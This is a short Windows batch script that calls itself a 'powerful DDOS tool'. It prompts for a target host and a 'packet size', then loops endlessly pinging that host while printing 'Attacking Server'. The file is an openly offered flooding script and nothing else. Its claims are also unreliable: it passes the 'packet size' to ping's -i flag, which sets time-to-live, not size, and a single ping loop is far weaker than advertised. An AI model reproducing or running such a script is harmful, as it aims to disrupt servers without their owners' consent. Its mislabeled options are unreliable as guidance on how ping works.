@echo off
Title Created by Aaditya Saxena A DDOS Attacker 
mode 67,16
color 0a
cls
echo.
echo �����������������������������������������������������������������
echo DDOS With Batch File A Powerful DDOS TOOL.
echo �����������������������������������������������������������������
echo.
set /p x=Server-Target:
echo.
echo �����������������������������������������������������������������
ping %x%
echo �����������������������������������������������������������������
@ping.exe 127.0.0.1 -n 5 -w 1000 > nul
goto Next
:Next
echo.
echo.
echo.
set /p m=ip Host:
echo.
set /p n=Packet Size:
echo.
:DDOS
color 0c
echo Attacking Server %m%
ping %m% -i %n% -t >nul
goto DDOS